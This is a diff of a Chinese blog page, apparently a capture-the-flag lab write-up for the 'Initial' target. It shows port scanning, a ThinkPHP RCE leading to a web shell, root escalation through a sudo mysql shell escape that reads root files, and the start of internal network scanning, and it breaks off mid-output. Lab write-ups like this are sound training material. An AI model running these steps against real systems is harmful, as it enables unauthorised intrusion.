@@ -1,702 +1,679 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=light>
-
-
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="cvbxy">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="春秋云镜Initial靶机记录">
-<meta property="og:type" content="article">
-<meta property="og:title" content="春秋云镜-Initial">
-<meta property="og:url" content="https://cvbxy.github.io/2024/06/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/index.html">
-<meta property="og:site_name" content="cvbxy&#39;s blog">
-<meta property="og:description" content="春秋云镜Initial靶机记录">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332463791-57797652-4a0e-46ac-9025-3444e3c62c51.png">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332500462-331496a3-bb28-4205-87f6-1a0ee05b9ee4.png">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332561841-80455797-aa2f-4b07-a53a-77c79fd95ebe.png">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332597688-808e5b85-1101-4a2e-9fe9-c590061583df.png">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332611935-3e0a1a3e-5739-4ce6-916b-d9ffa7a266fc.png">
-<meta property="og:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332641380-5951cc87-8d7e-49e2-98ef-d913d15cf6fd.png">
-<meta property="article:published_time" content="2024-06-20T11:46:03.000Z">
-<meta property="article:modified_time" content="2024-06-21T08:03:11.006Z">
-<meta property="article:author" content="cvbxy">
-<meta property="article:tag" content="渗透">
-<meta property="article:tag" content="春秋云镜">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cvbxy.github.io/img/blogimg/Initial/1704332463791-57797652-4a0e-46ac-9025-3444e3c62c51.png">
-  
-  
-  
-  <title>春秋云镜-Initial - cvbxy&#39;s blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="cvbxy">
+    
+    <title>
+        
+            春秋云镜-Initial |
+        
+        cvbxy
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+    
+        <link rel="shortcut icon" href="/images/logo.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
 
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
 
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/mac.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"cvbxy.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"cvbxy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"cvbxy","author":"cvbxy","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="cvbxy's blog" type="application/atom+xml">
 </head>
 
 
 <body>
-  
-
-  <header>
+<div class="progress-bar-container">
     
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>cvbxy&#39;s blog</strong>
-    </a>
+    
+</div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               cvbxy
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/banner.jpg') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="春秋云镜-Initial"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-06-20 19:46" pubdate>
-          2024年6月20日 晚上
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          1.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          12 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">春秋云镜-Initial</h1>
-            
-            
-              <div class="markdown-body">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
                 
-                <h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>fscan扫一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  .\fscan.exe -h 39.99.145.116<br>(icmp) Target 39.99.145.116   is alive<br>[*] Icmp alive hosts len is: 1<br>39.99.145.116:22 open<br>39.99.145.116:80 open<br>[*] alive ports len is: 2<br>start vulscan<br>[*] WebTitle: http://39.99.145.116      code:200 len:5578   title:Bootstrap Material Admin<br>[+] http://39.99.145.116 poc-yaml-thinkphp5023-method-rce poc1<br></code></pre></td></tr></table></figure>
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        春秋云镜-Initial
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">cvbxy</span>
+                                
+                                    <span class="author-badge">Lv1</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-06-20 19:46:03</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Wed Jul 17 2024 22:36:18 GMT+0800">2024-07-17 22:36:18</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>fscan扫一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  .\fscan.exe -h 39.99.145.116</span><br><span class="line">(icmp) Target 39.99.145.116   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">39.99.145.116:22 open</span><br><span class="line">39.99.145.116:80 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://39.99.145.116      code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] http://39.99.145.116 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure>
 
 <p>跑一下thinkphp漏洞利用工具</p>
-<p><img src="/img/blogimg/Initial/1704332463791-57797652-4a0e-46ac-9025-3444e3c62c51.png" srcset="/img/loading.gif" lazyload></p>
+<p><img   src="/images/blogimg/Initial/1704332463791-57797652-4a0e-46ac-9025-3444e3c62c51.png" ></p>
 <p>蚁剑连接，发现是www-data权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ <span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
 
 <p>sudo -l看看，有个mysql提权</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on ubuntu-web01:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br>User www-data may run the following commands on ubuntu-web01:<br>    (root) NOPASSWD: /usr/bin/mysql<br>sudo mysql -e <span class="hljs-string">&#x27;\! find / -name flag&#x27;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! find / -name flag&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/blogimg/Initial/1704332500462-331496a3-bb28-4205-87f6-1a0ee05b9ee4.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ sudo mysql -e <span class="hljs-string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span><br> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ <br>░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██<br> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ <br>  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         <br>   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████<br>  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██<br> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ <br>░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  <br>Congratulations!!! You found the first flag, the next flag may be <span class="hljs-keyword">in</span> a server <span class="hljs-keyword">in</span> the internal network.<br>flag01: flag&#123;60b53231-<br></code></pre></td></tr></table></figure>
+<p><img   src="/images/blogimg/Initial/1704332500462-331496a3-bb28-4205-87f6-1a0ee05b9ee4.png" ></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ sudo mysql -e <span class="string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span></span><br><span class="line"> ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ </span><br><span class="line">░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██</span><br><span class="line"> ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ </span><br><span class="line">  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         </span><br><span class="line">   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████</span><br><span class="line">  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██</span><br><span class="line"> ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ </span><br><span class="line">░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  </span><br><span class="line">Congratulations!!! You found the first flag, the next flag may be <span class="keyword">in</span> a server <span class="keyword">in</span> the internal network.</span><br><span class="line">flag01: flag&#123;60b53231-</span><br></pre></td></tr></table></figure>
 
 <h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>看一下网卡</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/var/www/html) $ ifconfig<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255<br>        inet6 fe80::216:3eff:fe24:4454  prefixlen 64  scopeid 0x20&lt;<span class="hljs-built_in">link</span>&gt;<br>        ether 00:16:3e:24:44:54  txqueuelen 1000  (Ethernet)<br>        RX packets 86593  bytes 116256508 (116.2 MB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 20752  bytes 3209660 (3.2 MB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1000  (Local Loopback)<br>        RX packets 658  bytes 58976 (58.9 KB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 658  bytes 58976 (58.9 KB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/var/www/html) $ ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe24:4454  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:24:44:54  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 86593  bytes 116256508 (116.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 20752  bytes 3209660 (3.2 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 658  bytes 58976 (58.9 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 658  bytes 58976 (58.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
 
 <p>fscan扫一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">(www-data:/tmp) $ <span class="hljs-built_in">cat</span> result.txt<br>172.22.1.15:22 open<br>172.22.1.2:139 open<br>172.22.1.18:139 open<br>172.22.1.21:135 